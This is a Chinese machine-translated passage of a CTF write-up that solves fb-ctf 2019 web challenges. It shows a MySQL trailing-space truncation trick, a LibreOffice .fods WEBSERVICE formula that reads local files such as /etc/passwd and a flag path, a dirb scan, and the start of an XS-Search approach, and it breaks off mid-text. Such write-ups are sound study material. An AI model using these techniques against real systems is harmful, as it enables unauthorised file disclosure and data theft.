<html>
<head>
<title>Solving each and every fb-ctf challenge PART 1</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">解决每个fb-ctf挑战第1部分</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0?source=collection_archive---------0-----------------------#2019-06-15">https://infosecwriteups.com/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0?source=collection_archive---------0-----------------------#2019-06-15</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="b5bd" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">fb-ctf网站类别中所有挑战的综述</h2></div><p id="c203" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">好吧，在开始之前，让我承认我的错误，我在5月26日回家后完全忘记了fb-ctf，当我发现这张纸条时，已经太晚了。<br/>尽管如此，我本可以提出一些挑战，但不幸的是，我在6月2日至4日收到了我的GSoC内部提交。</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi lb"><img src="../Images/7bb8ff4e8cc2758ec06500dd6617e361.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mFuH6rxx7pbYngrzvVxElg.png"/></div></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">悲哀。</figcaption></figure><p id="4884" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">是的，所以我在6月5日到8日之间完成了它，但是嘿，我在1日连接到IRC聊天(<strong class="kh ir"> #fb-ctf </strong>)并且偶尔阅读聊天，这很有趣！</p><figure class="lc ld le lf gt lg"><div class="bz fp l di"><div class="lr ls l"/></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">不，我也觉得很有趣</figcaption></figure><p id="2570" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">这又是一个危险风格的CTF，具有<strong class="kh ir"> <em class="lt">动态计分策略</em> </strong>，意味着<strong class="kh ir">分数</strong> <em class="lt">【自动】</em>根据“解决数”参数进行调整。<br/>有些人说它比普通的要难，我发现这是真的。</p><figure class="lc ld le lf gt lg"><div class="bz fp l di"><div class="lr ls l"/></div></figure><h1 id="cb11" class="lu lv iq bd lw lx ly lz ma mb mc md me jw mf jx mg jz mh ka mi kc mj kd mk ml bi translated">让黑客攻击开始吧</h1><figure class="lc ld le lf gt lg gh gi paragraph-image"><div class="ab gu cl mm"><img src="../Images/557f06ea6a7d68f1cb79ea2d1d2194f6.png" data-original-src="https://miro.medium.com/v2/1*cihPkdjv-7l7RqZdgI_BvA.gif"/></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">来自社交网络</figcaption></figure><h1 id="9ded" class="lu lv iq bd lw lx ly lz ma mb mc md me jw mf jx mg jz mh ka mi kc mj kd mk ml bi translated">Web::产品经理</h1><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi mn"><img src="../Images/ad82183001a0532939fdab919b7bdb08.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*20PG_ED0m3uIQ1WQclGavg.png"/></div></div></figure><h2 id="f7e2" class="mo lv iq bd lw mp mq dn ma mr ms dp me ko mt mu mg ks mv mw mi kw mx my mk mz bi translated">描述</h2><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi na"><img src="../Images/450049a36b53551b8f3d697577ff8199.png" data-original-src="https://miro.medium.com/v2/resize:fit:1240/format:webp/1*J1oa8f9vc8PeetLFHD6ATA.png"/></div></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">描述</figcaption></figure><h2 id="f243" class="mo lv iq bd lw mp mq dn ma mr ms dp me ko mt mu mg ks mv mw mi kw mx my mk mz bi translated">解决办法</h2><p id="3a10" class="pw-post-body-paragraph kf kg iq kh b ki nb jr kk kl nc ju kn ko nd kq kr ks ne ku kv kw nf ky kz la ij bi translated">我们有幸看到了这项挑战的源代码。</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi ng"><img src="../Images/d2730a6a166e72a1ba9d16f31dc9ce34.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DC4A-xCctGkeInpVvNjM8Q.png"/></div></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">db.php</figcaption></figure><p id="467c" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我们可以看到评论，它暗示了旗帜在哪里。这意味着我们需要访问<code class="fe nh ni nj nk b">facebook</code>元素的描述值。</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi nl"><img src="../Images/7965bd72d66d6b537ac541b43162cee1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MpSfUZhn9RTt3o7wKYCM-w.png"/></div></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">db.php</figcaption></figure><p id="a7a1" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在对<code class="fe nh ni nj nk b">db.php</code>的进一步检查中，由于SQL语句的正确准备，SQL注入似乎不是一个选项。</p><h1 id="ef98" class="lu lv iq bd lw lx ly lz ma mb mc md me jw mf jx mg jz mh ka mi kc mj kd mk ml bi translated">弱点</h1><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi nm"><img src="../Images/d9dbfe0f5a72248a3e49adfc7ffbecc1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3sBqSoLe1AQNaPpbtGarxA.png"/></div></div></figure><p id="9b26" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><code class="fe nh ni nj nk b">check_name_secret</code>检查输入的<code class="fe nh ni nj nk b">name</code>和<code class="fe nh ni nj nk b">secret</code>组合的产品是否存在。然而，<code class="fe nh ni nj nk b">get_product</code>函数只通过使用<code class="fe nh ni nj nk b">name</code>参数从数据库中返回一个元素！</p><p id="6da5" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">这意味着我们可以添加另一个名为<code class="fe nh ni nj nk b">facebook</code>的元素，它带有一个我们知道的<code class="fe nh ni nj nk b">secret</code>，并让程序返回找到的第一个名为<code class="fe nh ni nj nk b">facebook</code>的产品，即带有标志的产品！</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div class="gh gi nn"><img src="../Images/39cff1bc15c6061c9537e9f84f6d71b3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1370/format:webp/1*d93qIwyMNI1FxVRtl7_f8w.png"/></div></figure><p id="c68c" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">它抛出一个名称已经存在的错误。<strong class="kh ir"> <em class="lt">狗屁！</em> </strong> <br/>经过4-5个小时的搜索，阅读关于MySQL的资料，我了解了关于<strong class="kh ir"> SQL截断攻击</strong><em class="lt">(</em><a class="ae no" href="https://resources.infosecinstitute.com/sql-truncation-attack/#gref" rel="noopener ugc nofollow" target="_blank"><em class="lt">ref-1</em></a><em class="lt">|</em><a class="ae no" href="https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html" rel="noopener ugc nofollow" target="_blank"><em class="lt">ref-2</em></a><em class="lt">)</em></p><p id="efbb" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">实际上，这是MySQL的一个问题。MySQL不在二进制模式下比较字符串。默认情况下，使用更宽松的比较规则。</p><p id="9675" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">从文件中引用<a class="ae no" href="https://dev.mysql.com/doc/refman/5.7/en/char.html" rel="noopener ugc nofollow" target="_blank">的话</a>:</p><pre class="lc ld le lf gt np nk nq nr aw ns bi"><span id="aae9" class="mo lv iq nk b gy nt nu l nv nw">All MySQL collations are of type PADSPACE. <br/>This means that all CHAR, VARCHAR, and TEXT <br/>values in MySQL are compared without regard <br/>to any trailing spaces.</span></pre><p id="0226" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">这导致MySQL语句将<code class="fe nh ni nj nk b">"facebook "</code>视为与<code class="fe nh ni nj nk b">"facebook"</code>相同</p><h1 id="9bc1" class="lu lv iq bd lw lx ly lz ma mb mc md me jw mf jx mg jz mh ka mi kc mj kd mk ml bi translated">剥削！</h1><figure class="lc ld le lf gt lg gh gi paragraph-image"><div class="gh gi nx"><img src="../Images/9590980021bec0ffa7454ce71c551c49.png" data-original-src="https://miro.medium.com/v2/resize:fit:1356/format:webp/1*JwFrtcPz6UypbxTyViOCRg.png"/></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">密码就是desc本身</figcaption></figure><pre class="lc ld le lf gt np nk nq nr aw ns bi"><span id="70b7" class="mo lv iq nk b gy nt nu l nv nw">Product has been added</span></pre><figure class="lc ld le lf gt lg gh gi paragraph-image"><div class="gh gi ny"><img src="../Images/2f70475a163dbc971d5674b17c436b9b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1156/format:webp/1*FTDnAeJo7ojDQIAbxz183g.png"/></div></figure><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi nz"><img src="../Images/d4928fd25fdb07ed29c4c5345212fe0b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dMb8vfSJXhgNhvp5AGv7Ng.png"/></div></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">被剥削了！非1337标志:attaking _ sqi _ without _ injection _ is _ amazing _:)</figcaption></figure><h1 id="25e6" class="lu lv iq bd lw lx ly lz ma mb mc md me jw mf jx mg jz mh ka mi kc mj kd mk ml bi translated">Web :: pdfme</h1><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi mn"><img src="../Images/9da27680b7035a72d71f4de3647f7610.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*i5aYjP6WgPeU58-lt7zlQA.png"/></div></div></figure><h2 id="d183" class="mo lv iq bd lw mp mq dn ma mr ms dp me ko mt mu mg ks mv mw mi kw mx my mk mz bi translated">描述</h2><figure class="lc ld le lf gt lg gh gi paragraph-image"><div class="gh gi oa"><img src="../Images/b22548cdd9e17c8860045f9a65477baa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1210/format:webp/1*WOTyzySWU-XvQPZ9w8WWUA.png"/></div></figure><h2 id="0c87" class="mo lv iq bd lw mp mq dn ma mr ms dp me ko mt mu mg ks mv mw mi kw mx my mk mz bi translated">探索挑战</h2><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi ob"><img src="../Images/34d7b2af0e388b3f5407f6cb269b685e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Hj12ZYsP9HD0UHnuZ8DkXw.png"/></div></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">欢迎页面</figcaption></figure><h2 id="5ea6" class="mo lv iq bd lw mp mq dn ma mr ms dp me ko mt mu mg ks mv mw mi kw mx my mk mz bi translated">这到底是什么？福兹。</h2><figure class="lc ld le lf gt lg gh gi paragraph-image"><div class="gh gi oc"><img src="../Images/4653ff09a27ab4e27bf89c6d41f6f6c5.png" data-original-src="https://miro.medium.com/v2/resize:fit:730/format:webp/1*Z9I1pjysN_2NrFqNchBe3Q.png"/></div></figure><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi od"><img src="../Images/0691cd87c65a967caf6d95ba2bdc750b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nOQLbuMQcVyIa5PxEo_UKQ.png"/></div></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">OpenDocument电子表格XML定义</figcaption></figure><p id="f3f3" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">好吧，让我们忘记<strong class="kh ir">。fods </strong>一分钟，上传一个<strong class="kh ir">。TXT </strong>文件，看看会发生什么… <em class="lt">(知道它是否阻止了我们的请求)</em></p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi oe"><img src="../Images/970358f7921e1d4f3a52b1ed50def91f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nnZKmohl8uJgJ6FrgpoQsw.png"/></div></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">产生了1.pdf，是的机器人❤先生</figcaption></figure><p id="5941" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">哇，它改装了我们的<strong class="kh ir">。TXT </strong>文件并生成了一个<strong class="kh ir">。PDF <em class="lt"> <br/> </em> </strong> <em class="lt">(果然“pdfme”，还记得吗？)</em></p><p id="534e" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">利用上传页面的一种常见方式是上传外壳。<br/> <strong class="kh ir">步骤:</strong> <br/> 1 .成功上传外壳<br/> 2。访问shell <br/>我们已经检查过它没有任何文件扩展名验证机制，所以我们对第一步很满意。让我们跳到第二个。</p><p id="60e2" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">为了发现目录，让我们使用<strong class="kh ir"> dirb </strong>:</p><pre class="lc ld le lf gt np nk nq nr aw ns bi"><span id="118d" class="mo lv iq nk b gy nt nu l nv nw"><strong class="nk ir">dirb </strong><a class="ae no" href="http://challenges.fbctf.com:8084/" rel="noopener ugc nofollow" target="_blank"><strong class="nk ir">http://challenges.fbctf.com:8084/</strong></a></span></pre><p id="7f0a" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">当它运行时，让我们分析一下<strong class="kh ir">。生成的PDF文件</strong>:</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div class="gh gi of"><img src="../Images/11dd956042fb402e0d7f82ba8423d4fa.png" data-original-src="https://miro.medium.com/v2/resize:fit:796/format:webp/1*ntGhesCiwAO0ez39bWXlrA.png"/></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">查看元数据</figcaption></figure><p id="e297" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">嗯（表示踌躇等）..LibreOffice 6.0，这是最新版本吗？</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div class="gh gi og"><img src="../Images/e5272920eae114ae5ad1603696c2fef3.png" data-original-src="https://miro.medium.com/v2/resize:fit:968/format:webp/1*o4B_kBMC996ZUssLMF1_RQ.png"/></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">不，不是的</figcaption></figure><p id="f0c7" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">好吧，我知道下一步要找什么了！</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi oh"><img src="../Images/b6c65c8d302ba78c37aa5b5630f97573.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KypeXqJ3TjOqrNAhya0chg.png"/></div></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">图书馆办公室安全咨询页面</figcaption></figure><p id="6c38" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">啊哈！ <strong class="kh ir">远程任意文件泄露漏洞</strong>，我能闻到<strong class="kh ir"> <em class="lt">标志</em> </strong>。</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi oi"><img src="../Images/fc534b4d2fe4753ddcb534ef8cc53048.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*AffxQWstFly8LrzZ5s_g4Q.png"/></div></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">演职员表:<a class="ae no" href="https://www.exploit-db.com/raw/44022" rel="noopener ugc nofollow" target="_blank">https://www.exploit-db.com/raw/44022</a></figcaption></figure><p id="eeb5" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">哦，我明白了<strong class="kh ir">。<em class="lt">fods</em></strong><em class="lt"/>现在！<br/>我们把<strong class="kh ir"> <em class="lt"> poc.fods </em> </strong>复制粘贴一下，上传看看我们的理论行不行。</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi oj"><img src="../Images/f20cc2a0f3099b249674f4aee9562607.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RAGOs5wQlcpkfyI8LqJ16A.png"/></div></div></figure><p id="2950" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir">它没有</strong>，但是这个错误并不能证明它不起作用。让我们试着用我们自己的有效载荷来修改它。它有23 KB，我们肯定可以最小化这个概念验证。移除所有样式，并制作一个单独的有效负载来显示<strong class="kh ir"> /etc/passwd </strong></p><h2 id="4d76" class="mo lv iq bd lw mp mq dn ma mr ms dp me ko mt mu mg ks mv mw mi kw mx my mk mz bi translated"><strong class="ak">试试#2: </strong></h2><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi oe"><img src="../Images/4cb8e53e2f25c1b4b9fbda1799ac3eff.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lDR-Tmbxdj1xJPp84xTIAQ.png"/></div></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">成功！</figcaption></figure><p id="fd35" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><em class="lt">与此同时，</em></p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div class="gh gi ok"><img src="../Images/77bf0569eaa1a5d1d8d78f12c3a3716d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1008/format:webp/1*jC3lWZKj_xdNQuqpngMAiw.png"/></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">绝对不是该走的路。</figcaption></figure><p id="a745" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">既然能看到文件，那就试试看<strong class="kh ir">。bash_history </strong>，也许那会帮助我们知道旗帜的位置！</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi oe"><img src="../Images/f4c37cddbc316e888889ca339629bb22.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*35wI0vXpV5di2J1f68MY6A.png"/></div></div></figure><p id="3ade" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">没有！ <em class="lt">(对于不支持的协议，如ftp: //或file: //，WEBSERVICE返回#VALUE！错误值。)</em></p><p id="7a9f" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir"> <em class="lt">或者也许……</em></strong></p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi oe"><img src="../Images/c5fd72e6c049009a99ca3c700e3a6298.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gZc0umbEUjNLcCvQ8yba_g.png"/></div></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">哇哦。</figcaption></figure><pre class="lc ld le lf gt np nk nq nr aw ns bi"><span id="8075" class="mo lv iq nk b gy nt nu l nv nw">=WEBSERVICE("<strong class="nk ir"><em class="lt">/home/libreoffice_admin/flag</em></strong>")</span></pre><p id="fd29" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir">结尾</strong></p><h1 id="a791" class="lu lv iq bd lw lx ly lz ma mb mc md me jw mf jx mg jz mh ka mi kc mj kd mk ml bi translated">秘密笔记保管人</h1><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi ol"><img src="../Images/a17b412464989298ce1025e23a11bb9f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ag5jvIJBIX_4sW9pRkTx5g.png"/></div></div></figure><figure class="lc ld le lf gt lg gh gi paragraph-image"><div class="gh gi om"><img src="../Images/869d7497a889d8c3065052bb43a25619.png" data-original-src="https://miro.medium.com/v2/resize:fit:1144/format:webp/1*PYOczk-4BjJsEXo-m2TVFg.png"/></div></figure><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi on"><img src="../Images/223f8741b60cccc4c932ae46eda51f6e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*z9suQy9ZTkQ69P_JQa7VdQ.png"/></div></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">欢迎屏幕</figcaption></figure><p id="6494" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">点击“<em class="lt">所有笔记</em>，会出现:<em class="lt">(搜索笔记和报告bug也是如此)</em></p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi oe"><img src="../Images/62c4ee0b73f7bb0f7acec6851eeee845.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YeRxyjYJZu-iUDeJgxi_QA.png"/></div></div></figure><p id="8881" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">给出任何登录凭证都有效。我用了“根”/“根”。</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi oe"><img src="../Images/a3b855f0833cbf595e50eabed3094606.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2GJietAdA5OgcwSkh0bEUQ.png"/></div></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">保存名为“ping”的便笺</figcaption></figure><p id="42f3" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir">搜索注释:</strong></p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi oe"><img src="../Images/98bd40d87ebc249f0059344bd43d5ebe.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-j4I-9mJ0_vbmmAp1Gk71g.png"/></div></div></figure><p id="4dbf" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir">检查揭示:</strong></p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi oe"><img src="../Images/396a70afad87af7c79f03dac9d546b7e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iOSE5wa0_3Glmju3eQgDIg.png"/></div></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated"><iframe> ❤</iframe></figcaption></figure><p id="dd6b" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">它通过使用<strong class="kh ir"> &lt; iframe &gt; </strong>加载外部内容</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi oe"><img src="../Images/c362a4fbadf87f03cbc0b96397fdcbdb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OY8JPm4nE3K8VScZK_tTOQ.png"/></div></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">我可以访问它！</figcaption></figure><p id="104c" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我们试试枚举？</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi oo"><img src="../Images/041c92eeaf922accb4e132d42f1025db.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1o4Z97PHkKosaZHVNfjReA.png"/></div></div></figure><p id="d01f" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">酷，那么如果我们找到正确的<strong class="kh ir"> num，</strong>我们就可以泄漏标志了？对吗？<strong class="kh ir"><br/></strong><em class="lt">http://challenges.fbctf.com:8082/note/{#num}</em></p><p id="deee" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">过了一段时间，我知道了，我们不能直接访问别人的笔记。然后，我半心半意地尝试了XSS、CSRF之类的东西。在尝试这些的时候，当我试图提交一个错误报告时，我也看到了打嗝的请求。我注意到:</p><p id="ed63" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><code class="fe nh ni nj nk b">HeadlessChrome/74.0.3729.169 Safari/537.36</code>(<a class="ae no" href="https://developers.whatismybrowser.com/useragents/explore/software_name/chrome/2" rel="noopener ugc nofollow" target="_blank">https://developers . whatismybrowser . com/user agents/explore/software _ name/chrome/2</a>)</p><p id="43a8" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我停下来想，好吧，我们知道我们必须执行客户端攻击，但是没有用户交互？</p><p id="e478" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir"> <em class="lt">我放弃了</em> </strong>，所以，我得出了一个结论，我必须检查获得这个挑战的资料。但是奇怪的巧合发生了！</p><p id="59bc" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">无意中想起了<strong class="kh ir"> LiveOverflow </strong> <em class="lt">的一个视频(他的</em> <strong class="kh ir"> <em class="lt">最初在chrome视频上弹出</em> </strong> <em class="lt">)，然后渐渐地我想起了他给<em class="lt">解释</em>一些关于<strong class="kh ir"> XS的事情——搜索:</strong></em></p><figure class="lc ld le lf gt lg"><div class="bz fp l di"><div class="op ls l"/></div></figure><p id="75a3" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我开始知道<strong class="kh ir"> XS搜索</strong>是一个关于网络开发的最近的研究课题。这些攻击的主要目的是通过利用用户从服务中泄露信息。就像旁道攻击。这些攻击被执行<code class="fe nh ni nj nk b">Cross-Origin</code></p><p id="c959" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">稍微搜索了一下，我知道我们不能像<strong class="kh ir"> LiveOverflow </strong>在他的视频中那样使用确切的方式，因为他使用<strong class="kh ir"> CHROME_XSS_AUDITOR </strong>错误消息来构建他的漏洞，我们不能使用，因为它运行的<strong class="kh ir"> Chrome 74 </strong>过滤了那个消息。但是，建立一个条件是相当容易的。</p><p id="892b" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我们从最初的侦察中知道，如果我们执行一个返回1个结果的搜索，那么1个<code class="fe nh ni nj nk b">iframe</code>将与注释一起被创建，如果搜索没有返回结果，那么没有<code class="fe nh ni nj nk b">iframes</code>被创建。现在，我们可以用<strong class="kh ir">frames . length</strong><em class="lt">(</em><strong class="kh ir"><em class="lt">ref:</em></strong><a 